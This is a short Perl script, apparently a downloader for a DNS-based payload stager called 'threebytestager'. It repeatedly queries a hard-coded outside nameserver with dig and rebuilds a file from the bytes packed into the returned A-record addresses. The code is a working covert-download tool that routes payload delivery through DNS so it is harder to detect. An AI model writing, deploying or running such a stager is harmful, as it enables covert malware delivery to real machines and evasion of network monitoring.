#!/usr/bin/env perl
#
# downloader.pl
# Perl downloader for threebytestager
# By J. Stuart McMurray
# Created 20190422
# Last Modified 20190422

use warnings;
use strict;

my $FNAME = "services";

# Dig gets a DNS answer
sub dig {
        my $off = shift;
        # Make the query
        my $a = `dig \@159.65.38.203 $off.$FNAME.domain +short`;
        chomp $a;
        # Remove the leading byte
        $a =~ s/^\d+\.//;
        # Split into three bytes
        return split /\./, $a;
}

# Get size of file
my $size = 0;
for my $s (dig "ffffff") {
        $size <<= 8;
        $size += $s;
}

# Get the rest of the file
for (my $off = 0; $off < $size; $off += 3) {
        for my $b (dig sprintf "%02x", $off) {
                print chr $b;
        }
}
